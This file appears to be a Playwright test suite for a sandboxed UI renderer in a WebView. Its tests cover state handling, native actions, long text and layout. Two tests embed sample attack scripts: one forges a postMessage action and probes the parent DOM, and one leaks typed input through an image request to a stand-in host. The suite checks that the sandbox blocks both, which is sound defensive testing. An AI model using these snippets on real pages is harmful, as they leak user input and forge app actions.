import { expect, test, type Page } from "@playwright/test";
import { programs } from "../src/gallery/programs";
import { compositionPrograms } from "../src/gallery/composition-programs";
import { toolPrograms } from "../src/gallery/tool-programs";
const program = `root = Col([Input($name, "Name"), Slider($n, 0, 100, 1, "Amount"), Text("Value: " + $name + " / " + $n), Button("Increment", @Set($n, $n + 1)), Button("Reset", @Reset($name, $n)), Button("Ask", @ToAssistant("Help", {name:$name})), Link("Example", "https://example.com"), Code("hello")])
$name = "initial"
$n = 5`;
async function update(page: Page, source = program, extra: Record<string, unknown> = {}) { await page.evaluate(p => (window as any).OpenUiHost.update(p), { identity:"a",revision:1,source,streaming:false,interactive:true,theme:"light",...extra }); }
async function messages(page: Page) { return page.evaluate(()=>(window as any).messages); }
test.beforeEach(async ({ page }) => {
 await page.addInitScript(() => { if(window.top !== window.self) return; (window as any).messages=[]; (window as any).NativeOpenUi={postMessage:(text:string)=>(window as any).messages.push(JSON.parse(text))}; });
 await page.goto("/index.html"); await page.waitForFunction(()=>!!(window as any).OpenUiHost);
});
test("real state updates survive append and reset on rollback, replacement, identity", async ({page}) => {
 await update(page); await expect(page.getByLabel("Name",{exact:true})).toHaveValue("initial");
 await page.getByLabel("Name",{exact:true}).fill("edited");
 await page.getByRole("button",{name:"Increment"}).click(); await expect(page.getByText("Value: edited / 6")).toBeVisible();
 await update(page, program+"\n# appended", {revision:2}); await expect(page.getByLabel("Name",{exact:true})).toHaveValue("edited");
 await update(page, program, {revision:3}); await expect(page.getByLabel("Name",{exact:true})).toHaveValue("initial");
 await page.getByLabel("Name",{exact:true}).fill("again");
 await update(page, program.replace('"initial"','"changed"'), {revision:4}); await expect(page.getByLabel("Name",{exact:true})).toHaveValue("changed");
 await update(page, program, {identity:"b",revision:0}); await expect(page.getByLabel("Name",{exact:true})).toHaveValue("initial");
 await page.getByRole("button",{name:"Increment"}).click(); await page.getByRole("button",{name:"Reset",exact:true}).click(); await expect(page.getByText("Value: initial / 5")).toBeVisible();
});
test("external actions only request native draft/link/copy and include current form values", async ({page}) => {
 await update(page); await page.getByLabel("Name",{exact:true}).fill("Ada");
 await page.getByRole("button",{name:"Ask",exact:true}).click(); await page.getByRole("link",{name:"Example"}).click(); await page.getByRole("button",{name:"Copy code"}).click();
 const list = (await messages(page)).filter((e:any)=>e.type === "action"); expect(list.map((e:any)=>e.action)).toEqual(["ToAssistant","OpenUrl","CopyToClipboard"]); expect(list[0].value).toContain("Ada"); expect(page.url()).toContain("index.html");
});
test("noninteractive keyboard and pointer cannot execute actions or mutate controls", async ({page}) => {
 await update(page,program,{interactive:false});
 await page.locator("button").filter({hasText:"Increment"}).evaluate((node:HTMLElement)=>node.click());
 await page.locator("button").filter({hasText:"Ask"}).evaluate((node:HTMLElement)=>node.click());
 expect(await page.locator("input.iui-input").evaluate((node:HTMLElement)=>node.inert)).toBe(true);
 await expect(page.getByText("Value: initial / 5")).toBeVisible(); expect((await messages(page)).filter((e:any)=>e.type === "action")).toEqual([]);
});
test("HtmlView runs inline tools while sandbox denies native bridge and parent DOM", async ({page}) => {
 const html = `<button id="go">Start</button><p id="security"></p><script>document.getElementById('go').onclick=()=>document.getElementById('go').textContent='Ran';let denied=false;try{parent.document.body}catch(e){denied=true}document.getElementById('security').textContent=String(denied)+'/'+typeof window.NativeOpenUi;parent.postMessage({type:'action',action:'ToAssistant',value:'malicious'},'*')</script>`;
 await update(page, `root = Col([HtmlView(${JSON.stringify(html)})])`);
 const frame = page.frameLocator("iframe"); await expect(frame.locator("#go")).toBeVisible(); await frame.locator("#go").click(); await expect(frame.locator("#go")).toHaveText("Ran"); await expect(frame.locator("#security")).toHaveText("true/undefined"); expect((await messages(page)).filter((e:any)=>e.type === "action")).toEqual([]);
});
test("HtmlView blocks remote image requests but allows data images", async ({page}) => {
 const remoteRequests: string[] = [];
 await page.route("https://example.test/**", route => { remoteRequests.push(route.request().url()); return route.abort(); });
 const marker = "PRIVATE_INPUT_73d91";
 const html = `<input id="entry"><img id="remote" style="width:24px;height:24px" src="https://example.test/collect?value=initial"><img id="local" style="width:24px;height:24px" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs="><script>document.getElementById('entry').oninput=e=>{document.getElementById('remote').src='https://example.test/collect?value='+encodeURIComponent(e.target.value);document.body.dataset.entered=e.target.value}</script>`;
 await update(page, `root = Col([HtmlView(${JSON.stringify(html)})])`);
 const frame = page.frameLocator("iframe"); await expect(frame.locator("#remote")).toBeVisible(); await expect(frame.locator("#local")).toBeVisible();
 await expect.poll(()=>frame.locator("#local").evaluate((node:HTMLImageElement)=>node.naturalWidth)).toBeGreaterThan(0);
 await frame.locator("#entry").fill(marker);
 await expect(frame.locator("body")).toHaveAttribute("data-entered",marker);
 await expect(frame.locator("#remote")).toHaveAttribute("src",`https://example.test/collect?value=${marker}`);
 await page.waitForTimeout(250); expect(remoteRequests).toEqual([]);
});
test("streaming incomplete chunks converge, long answer reports actual height and dark ink", async ({page}) => {
 const source = `root = Col([Text(${JSON.stringify("长中文段落与公式展示 ".repeat(4000))})])`;
 for(let i=0;i<source.length;i+=1300) await update(page,source.slice(0,i),{revision:i+1,streaming:true,interactive:false});
 await update(page,source,{revision:source.length+1,theme:"dark"});
 await expect.poll(async()=> (await messages(page)).filter((e:any)=>e.type==="height").at(-1)?.height).toBeGreaterThan(10000);
 expect(await page.locator("main").evaluate(node=>getComputedStyle(node).color)).toBe("rgb(236, 236, 236)");
});
test("non-streaming long text preserves a plain sentinel at the tail", async ({page}) => {
 const longText = ("Long Android WebView line 中文长回答 0123456789. ".repeat(6000)) + "FINALTAIL931";
 await update(page, `root = Col([Text(${JSON.stringify(longText)})])`);
 await expect.poll(async()=> page.locator("#root").evaluate(node=>node.getBoundingClientRect().height)).toBeGreaterThan(1000);
 await expect.poll(async()=> page.locator("body").textContent()).toContain("FINALTAIL931");
});
test("all upstream component/composition/tool programs render with no parser alerts", async ({page}) => {
 test.setTimeout(180000);
 // External media is a real network integration tested separately; avoid depending on public services here.
 await page.route("https://**/*",route=>route.abort());
 const errors: string[] = []; page.on("pageerror", error=>errors.push(error.message));
 for(const item of [...programs,...compositionPrograms]) {
  await update(page,item.code,{identity:item.id});
  await page.evaluate(()=>new Promise<void>(resolve=>requestAnimationFrame(()=>requestAnimationFrame(()=>resolve()))));
  await expect(page.locator(".render-error"),item.id).toHaveCount(0);
  await expect(page.getByRole("alert"),item.id).toHaveCount(0);
  expect(errors,item.id).toEqual([]);
 }
 await page.goto("/gallery.html");
 await expect(page.locator(".gallery-example")).toHaveCount(programs.length + compositionPrograms.length + toolPrograms.length + 4);
 await page.evaluate(()=>new Promise<void>(resolve=>requestAnimationFrame(()=>requestAnimationFrame(()=>resolve()))));
 await page.waitForTimeout(700);
 await expect(page.locator(".gallery-errors")).toHaveCount(0); expect(errors).toEqual([]);
});

test("native form controls and local flashcards react without network or assistant actions", async ({page}) => {
 const source = `root = Col([Checkbox($done,"Done"),Select($pick,["A","B"],"Pick"),RadioGroup($radio,["One","Two"],"Radio"),SegmentedControl($segment,["Left","Right"]),Slider($number,0,10,1,"Number"),DatePicker($day,"Day"),TextArea($note,"Note"),Text("Result: " + $done + "/" + $pick + "/" + $radio + "/" + $segment + "/" + $number + "/" + $day + "/" + $note),Flashcard("Question","Answer")])\n$done=false\n$pick="A"\n$radio="One"\n$segment="Left"\n$number=3\n$day="2026-10-26"\n$note=""`;
 await update(page,source); await page.getByLabel("Done",{exact:true}).check(); await page.getByRole("combobox",{name:"Pick",exact:true}).selectOption("B"); await page.getByLabel("Two",{exact:true}).check(); await page.getByRole("radio",{name:"Right",exact:true}).click();
 await page.getByLabel("Number",{exact:true}).focus(); await page.keyboard.press("ArrowRight"); await page.getByLabel("Day",{exact:true}).fill("2026-10-27"); await page.getByLabel("Note",{exact:true}).fill("edited");
 await expect(page.getByText("Result: true/B/Two/Right/4/2026-10-27/edited")).toBeVisible();
 await page.locator(".iui-flashcard").click(); await expect(page.locator(".iui-flashcard")).toHaveAttribute("aria-pressed","true"); expect((await messages(page)).filter((e:any)=>e.type==="action")).toEqual([]);
});

test("unavailable WebGL keeps the answer and reports map failure", async ({page}) => {
 await page.route("https://**/*", route=>route.abort());
 await page.evaluate(()=>{ const original=HTMLCanvasElement.prototype.getContext; HTMLCanvasElement.prototype.getContext=function(this:HTMLCanvasElement,type:any,...args:any[]){if(String(type).startsWith("webgl"))return null; return (original as any).call(this,type,...args)} as any; });
 await update(page,'root = Col([Text("Answer survives"),Map([MapMarker("Place",37.7,-122.4)])])');
 await expect(page.locator(".iui-map-error")).toBeVisible(); await expect(page.getByText("Answer survives")).toBeVisible(); await expect(page.getByRole("alert")).toHaveCount(0);
});

test("embedded Popover and expanded Map contribute bounded native content height", async ({page}) => {
 await page.setViewportSize({width:390,height:36});
 await update(page,'root = Col([Popover("Details",[Text("Hidden detail"),Button("Local action",@Set($n,$n+1))])])\n$n=0');
 const lastHeight=async()=> (await messages(page)).filter((e:any)=>e.type==="height").at(-1)?.height;
 await expect.poll(lastHeight).toBeGreaterThan(1); const collapsed=await lastHeight();
 await page.getByRole("button",{name:"Details",exact:true}).click(); await expect.poll(lastHeight).toBeGreaterThan(collapsed+25);
 const expanded=await lastHeight(); await page.setViewportSize({width:390,height:expanded}); await expect(page.getByText("Hidden detail")).toBeInViewport(); await expect(page.getByRole("button",{name:"Local action",exact:true})).toBeInViewport();
 await page.getByRole("button",{name:"Details",exact:true}).click(); await expect.poll(lastHeight).toBe(collapsed);
 await page.route("https://**/*",route=>route.abort()); await page.setViewportSize({width:390,height:20000});
 await update(page,'root = Col([Map([MapMarker("Place",37.7,-122.4)])])',{identity:"map"});
 await page.getByRole("button",{name:"Expand",exact:true}).click(); expect(await page.locator(".iui-map").evaluate(node=>node.getBoundingClientRect().height)).toBeLessThanOrEqual(600);
 await page.getByRole("button",{name:"Collapse",exact:true}).click(); await expect(page.locator(".iui-map")).not.toHaveClass(/is-expanded/);
});

test("lifecycle pause suspends Timer and sandbox loops, keeps state, and makes child inert", async ({page}) => {
 const html = `<button id="go">Start</button><p id="ticks">0</p><script>let n=0;setInterval(()=>document.getElementById('ticks').textContent=String(++n),100);document.getElementById('go').onclick=()=>document.getElementById('go').textContent='Ran'</script>`;
 await update(page,`root = Col([Timer($left, "Countdown"), HtmlView(${JSON.stringify(html)})])\n$left = 20`);
 await page.getByRole("button",{name:"Start",exact:true}).click();
 const ticks = page.frameLocator("iframe").locator("#ticks"); await expect(ticks).not.toHaveText("0");
 await page.evaluate(()=>(window as any).OpenUiHost.setPaused(true));
 await page.waitForTimeout(150);
 const pausedTicks = await ticks.textContent(); const pausedTime = await page.locator(".iui-timer-time").textContent();
 await page.waitForTimeout(1200); expect(await ticks.textContent()).toBe(pausedTicks); expect(await page.locator(".iui-timer-time").textContent()).toBe(pausedTime);
 expect(await page.locator("iframe").evaluate((node:HTMLElement)=>node.inert)).toBe(true);
 await page.evaluate(()=>(window as any).OpenUiHost.setPaused(false));
 await expect(ticks).not.toHaveText(pausedTicks!); await expect(page.locator(".iui-timer-time")).not.toHaveText(pausedTime!);
 await page.frameLocator("iframe").locator("#go").click(); await expect(page.frameLocator("iframe").locator("#go")).toHaveText("Ran");
});
